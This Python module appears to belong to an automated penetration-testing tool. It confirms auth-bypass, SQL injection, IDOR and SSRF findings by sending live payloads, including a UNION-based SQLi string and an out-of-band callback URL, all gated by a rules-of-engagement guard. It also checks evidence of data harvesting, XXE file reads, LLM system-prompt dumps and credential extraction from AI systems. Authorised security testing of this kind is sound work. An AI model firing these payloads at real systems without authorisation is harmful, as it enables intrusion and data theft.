from __future__ import annotations

from .config import load_engine
from .roe_guard import ROEGuard, ROEViolation
from . import http as _http


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="GET"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return f"ROE guard unavailable (fail-closed): {e}"
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _default_headers(headers, cookies):
    h = dict(headers or {})
    if cookies and not any(k.lower() == "cookie" for k in h):
        h["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
    return h


def confirm_auth_bypass(target_url, forged_token, headers=None, cookies=None,
                        timeout=8, roe_guard=None):
    verify = _verify_tls()
    viol = _roe_block(roe_guard, target_url, "GET")
    if viol:
        return {"confirmed": False, "reason": f"ROE_BLOCK: {viol}"}
    h = _default_headers(headers, cookies)
    if forged_token:
        h["Authorization"] = f"Bearer {forged_token}"
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            r = c.get(target_url, headers=h)
        if r.status_code in (200, 201, 202):
            return {"confirmed": True,
                    "reason": f"forged token accepted (HTTP {r.status_code})",
                    "evidence": {"status": r.status_code,
                                 "body_preview": (r.text or "")[:200]}}
        return {"confirmed": False,
                "reason": f"forged token rejected (HTTP {r.status_code})"}
    except Exception as e:
        return {"confirmed": False, "reason": f"{type(e).__name__}: {e}"}


def confirm_sqli_reflection(target_url, param, method="GET", headers=None,
                            timeout=8, roe_guard=None):
    verify = _verify_tls()
    marker = "SC_CONFIRM_5121"
    payload = f"' UNION SELECT '{marker}'-- -"
    viol = _roe_block(roe_guard, target_url, method)
    if viol:
        return {"confirmed": False, "reason": f"ROE_BLOCK: {viol}"}
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            if method.upper() == "POST":
                r = c.post(target_url, data={param: payload},
                           headers=headers or {})
            else:
                r = c.get(target_url, params={param: payload},
                          headers=headers or {})
        body = r.text or ""
        if marker in body:
            return {"confirmed": True,
                    "reason": "UNION marker reflected in response",
                    "evidence": {"status": r.status_code,
                                 "preview": body[:300]}}
        return {"confirmed": False,
                "reason": "UNION marker not reflected",
                "evidence": {"status": r.status_code}}
    except Exception as e:
        return {"confirmed": False, "reason": f"{type(e).__name__}: {e}"}


def confirm_idor_neighbor(target_url, own_id, neighbor_id, headers=None,
                          cookies=None, timeout=8, roe_guard=None):
    verify = _verify_tls()
    h = _default_headers(headers, cookies)
    base = target_url.rstrip("/")
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            viol_own = _roe_block(roe_guard, f"{base}/{own_id}", "GET")
            if viol_own:
                return {"confirmed": False, "reason": f"ROE_BLOCK: {viol_own}"}
            r_own = c.get(f"{base}/{own_id}", headers=h)
            viol_nb = _roe_block(roe_guard, f"{base}/{neighbor_id}", "GET")
            if viol_nb:
                return {"confirmed": False,
                        "reason": f"ROE_BLOCK: {viol_nb}"}
            r_nb = c.get(f"{base}/{neighbor_id}", headers=h)
        if (r_own.status_code == 200 and r_nb.status_code == 200
                and r_own.text != r_nb.text):
            return {"confirmed": True,
                    "reason": f"neighbor id {neighbor_id} returned different 200 body",
                    "evidence": {"own_len": len(r_own.text or ""),
                                 "neighbor_len": len(r_nb.text or "")}}
        return {"confirmed": False,
                "reason": f"no distinct neighbor response "
                          f"(own={r_own.status_code}, neighbor={r_nb.status_code})"}
    except Exception as e:
        return {"confirmed": False, "reason": f"{type(e).__name__}: {e}"}


def confirm_ssrf_callback(target_url, param, oob=None, method="GET",
                          headers=None, timeout=8, roe_guard=None,
                          wait=4.0):
    if oob is None:
        try:
            from .oob_registry import get_shared_oob
            oob = get_shared_oob()
        except Exception:
            return {"confirmed": False, "reason": "no OOB available"}
    token, payload_url = oob.payload_url()
    viol = _roe_block(roe_guard, target_url, method)
    if viol:
        return {"confirmed": False, "reason": f"ROE_BLOCK: {viol}"}
    verify = _verify_tls()
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            if method.upper() == "POST":
                c.post(target_url, data={param: payload_url},
                       headers=headers or {})
            else:
                c.get(target_url, params={param: payload_url},
                      headers=headers or {})
    except Exception as e:
        return {"confirmed": False, "reason": f"{type(e).__name__}: {e}"}
    if oob.wait_for_hit(token, timeout=wait):
        return {"confirmed": True,
                "reason": "OOB callback received",
                "evidence": {"token": token}}
    return {"confirmed": False, "reason": "no OOB callback"}




def _confirm_bola_harvest(finding, ctx):
    ev = (finding or {}).get("evidence") or {}
    records = ev.get("extracted_records") or ev.get("records") or []
    if not records:
        return {"confirmed": False,
                "reason": "no records to confirm"}
    owners = set()
    for r in records:
        if not isinstance(r, dict):
            continue
        for k in ("owner", "owner_id", "user_id", "email", "account_id"):
            if r.get(k) is not None:
                owners.add(str(r.get(k)))
                break
    if len(owners) >= 2:
        return {"confirmed": True,
                "reason": f"harvested {len(records)} record(s) across "
                          f"{len(owners)} distinct owners"}
    if len(records) >= 2:
        return {"confirmed": True,
                "reason": f"harvested {len(records)} record(s) "
                          f"(single-owner sample)"}
    return {"confirmed": False,
            "reason": "single record harvest is not enough to confirm BOLA"}


def _confirm_blind_sqli_extract(finding, ctx):
    ev = (finding or {}).get("evidence") or {}
    extracted = ev.get("extracted_value") or ev.get("value") or ""
    if not extracted or not isinstance(extracted, str):
        return {"confirmed": False, "reason": "no extracted value to confirm"}
    if len(extracted) < 3:
        return {"confirmed": False,
                "reason": f"extracted value too short ({len(extracted)} chars)"}
    return {"confirmed": True,
            "reason": f"reconstructed {len(extracted)} character(s) via blind extraction"}


def _confirm_graphql_data_dump(finding, ctx):
    ev = (finding or {}).get("evidence") or {}
    types = ev.get("dumped_types") or ev.get("types") or []
    records = ev.get("extracted_records") or ev.get("records") or []
    if types and records:
        return {"confirmed": True,
                "reason": f"dumped {len(types)} type(s), "
                          f"{len(records)} record(s) extracted"}
    if types:
        return {"confirmed": True,
                "reason": f"schema dump: {len(types)} type(s)"}
    return {"confirmed": False, "reason": "no schema or records dumped"}


def _confirm_blind_xxe_file_read(finding, ctx):
    ev = (finding or {}).get("evidence") or {}
    files = ev.get("files_read") or ev.get("files") or []
    if not files:
        return {"confirmed": False, "reason": "no files read"}
    return {"confirmed": True,
            "reason": f"file read confirmed: {', '.join(str(f) for f in files[:3])}"}


def _confirm_llm_prompt_dump(finding, ctx):
    ev = (finding or {}).get("evidence") or {}
    prompt = ev.get("system_prompt") or ev.get("leaked_prompt") or ""
    if not prompt or len(str(prompt)) < 40:
        return {"confirmed": False,
                "reason": "no substantive system prompt recovered"}
    return {"confirmed": True,
            "reason": f"system prompt recovered ({len(str(prompt))} chars)"}


def _confirm_llm_cred_extract(finding, ctx):
    ev = (finding or {}).get("evidence") or {}
    creds = ev.get("credentials") or ev.get("leaked_secrets") or []
    if not creds:
        return {"confirmed": False, "reason": "no credentials in output"}
    return {"confirmed": True,
            "reason": f"{len(creds)} credential(s) recovered"}


def _confirm_generic_extraction(finding, ctx):
    ev = (finding or {}).get("evidence") or {}
    if ev.get("extracted_data") or ev.get("extracted_records") or \
            ev.get("records") or ev.get("files_read"):
        return {"confirmed": True, "reason": "extraction evidence present"}
    return {"confirmed": False, "reason": "no extraction evidence"}

_DISPATCH = {
    "bola_harvest": _confirm_bola_harvest,
    "blind_sqli_extract": _confirm_blind_sqli_extract,
    "graphql_data_dump": _confirm_graphql_data_dump,
    "blind_xxe_file_read": _confirm_blind_xxe_file_read,
    "llm_system_prompt_dump": _confirm_llm_prompt_dump,
    "llm_credential_extract": _confirm_llm_cred_extract,
    "unauth_pagination_dump": _confirm_generic_extraction,
    "mcp_tool_poisoning": _confirm_generic_extraction,
    "mcp_credential_exposure": _confirm_generic_extraction,
    "auth_bypass": lambda finding, ctx: confirm_auth_bypass(
        ctx.get("target", ""),
        finding.get("evidence", {}).get("forged_token") or "",
        headers=ctx.get("headers"), cookies=ctx.get("cookies"),
        roe_guard=ctx.get("roe_guard")),
    "sqli_scan": lambda finding, ctx: confirm_sqli_reflection(
        ctx.get("target", ""),
        finding.get("evidence", {}).get("param") or ctx.get("param", ""),
        method=ctx.get("method", "GET"),
        headers=ctx.get("headers"),
        roe_guard=ctx.get("roe_guard")),
    "idor_scan": lambda finding, ctx: confirm_idor_neighbor(
        finding.get("evidence", {}).get("resource_base") or ctx.get("target", ""),
        finding.get("evidence", {}).get("own_id") or 1,
        finding.get("evidence", {}).get("neighbor_id") or 2,
        headers=ctx.get("headers"), cookies=ctx.get("cookies"),
        roe_guard=ctx.get("roe_guard")),
    "ssrf_scan": lambda finding, ctx: confirm_ssrf_callback(
        ctx.get("target", ""),
        ctx.get("param", "url"),
        headers=ctx.get("headers"),
        roe_guard=ctx.get("roe_guard")),
}


def confirm(capability, finding, context=None):
    if not capability:
        return {"confirmed": False, "reason": "no capability"}
    ctx = context or {}
    try:
        cfg = load_engine() or {}
        if not (cfg.get("confirm") or {}).get("enabled", True):
            return {"confirmed": False, "reason": "confirm.enabled=false"}
    except Exception:
        pass
    handler = _DISPATCH.get(capability)
    if handler is None:
        return {"confirmed": False,
                "reason": f"no confirmation handler for {capability}"}
    try:
        return handler(finding or {}, ctx)
    except Exception as e:
        return {"confirmed": False,
                "reason": f"confirmation error: {type(e).__name__}: {e}"}


__all__ = ["confirm", "confirm_auth_bypass", "confirm_sqli_reflection",
           "confirm_idor_neighbor", "confirm_ssrf_callback"]
